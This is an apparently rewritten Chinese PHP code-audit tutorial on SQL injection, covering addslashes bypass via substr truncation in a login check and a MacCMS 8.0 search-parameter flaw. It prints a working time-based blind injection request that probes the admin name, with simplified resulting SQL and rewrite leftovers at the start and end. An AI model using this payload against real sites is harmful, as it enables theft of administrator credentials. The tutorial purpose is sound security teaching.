### 优化后的文本

**作者：红日安全成员 l1nk3r**

如有不当之处，敬请指正。

---

## 前言

大家好，我们是红日安全-代码审计小组。最近，我们正在开展一个名为 [PHP-Audit-Labs](https://github.com/hongriSec/PHP-Audit-Labs) 的项目，旨在提供一个学习和交流的平台。目前发布的系列文章属于项目的 **第一阶段**，内容均来自 [PHP SECURITY CALENDAR 2017](https://www.ripstech.com/php-security-calendar-2017/)。每篇文章将包含详细的分析，并结合实际CMS进行解说。此外，在文章末尾还将提供一道CTF题目供读者练习。以下是第13篇关于代码审计的文章：

## Day 13 - Turkey Baster

### 代码审查

以下是一个典型的用户登录程序，主要考察点在于通过 **SQL注入** 绕过登录验证。在代码的第33行，通过 **POST** 方法接收 **user** 和 **passwd** 两个参数，并使用 **isValid()** 函数判断登录是否合法。该函数的核心逻辑位于第12至22行，其中第13行和第14行调用 **sanitizeInput()** 对输入数据进行处理。

**sanitizeInput()** 函数（第24至29行）首先使用 **addslashes** 函数对输入进行转义，然后检查其长度是否超过20个字符，若超过则截取前20个字符。**addslashes** 函数的作用是在单引号、双引号、反斜线及NULL字符前添加反斜线。然而，尽管已过滤了单引号，但由于 **substr** 函数的存在，仍有可能发生注入攻击。

示例说明：
```php
// 示例代码片段
$user = sanitizeInput($_POST['user']);
$passwd = sanitizeInput($_POST['passwd']);
$sql = "SELECT count(p) FROM user u WHERE user = '$user' AND password = '$passwd'";
```
在此情况下，即使单引号被转义，如果输入值足够长且包含适当的反斜杠与单引号组合，则可能造成SQL语句结构破坏，从而实现注入。

### 实例分析

以苹果CMS视频分享程序8.0为例，漏洞存在于 **inc\common\template.php** 文件中。具体来说，第三至四行的 **$lp['wd']** 变量拼接处存在SQL注入风险。尽管系统采取了一些防护措施，如使用 **chkSql()** 函数对请求参数进行处理，但这些措施并不完全有效。

关键路径包括：
- **inc\module\vod.php**：当方法为 **search** 时，从 **REQUEST** 获取并处理 **wd** 参数。
- **inc\common\function.php**：定义了 **be()** 函数用于获取并转义请求参数。
- **inc\common\360_safe3.php**：实现了 **chkSql()** 和 **StopAttack()** 函数，前者负责解码URL编码的数据，后者则通过正则表达式进一步清理潜在恶意内容。
- **htmlEncode()**：最终阶段的字符串处理函数，虽然针对特定符号进行了实体编码转换，但忽略了其他空白字符及反斜杠的处理。

### 漏洞验证

为了验证此漏洞，可以构造如下POC请求：
```http
POST /maccms8/index.php?m=vod-search HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 98

wd=))||if((select%0b(select(m_name)``from(mac_manager))regexp(0x5e61)),(`sleep`(3)),0)#%25%35%63
```

经过一系列处理后，生成的SQL查询如下所示：
```sql
SELECT * FROM table WHERE column = '))||if((select select(m_name) from(mac_manager) regexp ^a), sleep(3), 0) #'
```

### 漏洞修复建议

尽管现有防御机制较为全面，但依然存在可利用漏洞。建议加强对特殊字符的处理，尤其是反斜杠以及非标准空白符，并确保所有输入数据都经过严格的验证与清洗。

---

希望上述改进使原文更加清晰易懂。